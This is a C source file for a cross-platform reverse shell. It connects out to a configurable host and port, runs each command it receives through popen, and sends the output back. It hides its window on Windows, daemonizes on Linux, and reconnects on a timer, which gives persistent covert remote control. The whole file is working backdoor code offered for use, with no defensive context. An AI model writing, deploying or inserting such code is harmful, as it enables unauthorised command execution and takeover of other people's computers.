/*
 * MIT License
 * Copyright (c) 2018 Zhang Yi Da
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define forever 1024
#if defined(__linux) || defined(__linux__) || defined(linux)
  #define LINUX
  // Linux
  #include <unistd.h>
  #include <arpa/inet.h>

  #define pipe_open            popen
  #define pipe_close           pclose
  #define fd_close             close

#elif defined(__MINGW32__) || defined(_WIN32) || defined(__WIN32__) || defined(WIN32)
  #define WINDOWS
  // Windows
  #include <winsock2.h>
  #include <windows.h>

  #define pipe_open            _popen
  #define pipe_close           _pclose
  #define fd_close             closesocket
  #define sleep(seconds)       Sleep(seconds * 1000)

  #pragma comment(lib, "ws2_32.lib")
  #pragma comment(lib, "user32.lib")

#else
#error Unrecognized Platform.
#endif


void console(char* ip, unsigned short port) {
  FILE* pipe;
  char buff[1024];
  int sockfd, var = 0;
  struct sockaddr_in sin;

#if defined(WINDOWS)
  WSADATA wsad;
  WSAStartup(MAKEWORD(2, 2), &wsad);
#endif

  sin.sin_family = AF_INET;
  sin.sin_port   = htons(port);
  sin.sin_addr.s_addr = inet_addr(ip);

  sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if (sockfd == -1)
    return;

  // connect to remote
  var = connect(sockfd, (void*)&sin, sizeof(struct sockaddr_in));
  if (var == -1)
    return;

  while (forever) {
    // zero buffer
    for (var = 0; var < sizeof(buff); var++)
      buff[var] = 0;

    // receive command line
    if (recv(sockfd, buff, sizeof(buff), 0) <= 0)
      break;
    // execute command
    if ((pipe = pipe_open(buff, "r")) == NULL)
      break;
    // send command output (only stdout)
    while (!feof(pipe) && fread(buff, 1, 1, pipe) == 1)
      if (send(sockfd, buff, 1, 0) != 1)
        break;
    // cleanup
    pipe_close(pipe);
    if (send(sockfd, "\x00\x00", 2, 0) != 2)
      break;
  }
  fd_close(sockfd);
#ifdef WINDOWS
  WSACleanup();
#endif
}


int main(int argc, char* argv[]) {
  char buff[512] = {0};
  char sep[2] = ":", *next, *host;
  int port = 36987, interval = 60, t = 0;

  // no argument provided, set default server address.
  char *cmdline = "";
  // means:
  // if no argument provided (open executable directly)
  // then use this string as the default argument.
  // example: char *cmdline = "127.0.0.1:12369:60";

  // run in background
#if defined(WINDOWS)
  HANDLE hWnd = GetForegroundWindow();
  ShowWindow(hWnd, SW_HIDE);
#elif defined(LINUX)
  daemon(0, 0);
#endif

  strncpy(buff, argc > 1?argv[1]: cmdline, sizeof(buff));
  if ((host = strtok(buff, sep)) != NULL) {
    // parse port
    next = strtok(NULL, sep);
    if (next && (t = atoi(next)) != 0)
      port = t;

    // parse sleep interval
    next = strtok(NULL, sep);
    if (next && (t = atoi(next)) != 0)
      interval = t;

    while (forever) {
      console(host, (unsigned short)port);
      sleep(interval);
    }
  }
  return 0;
}
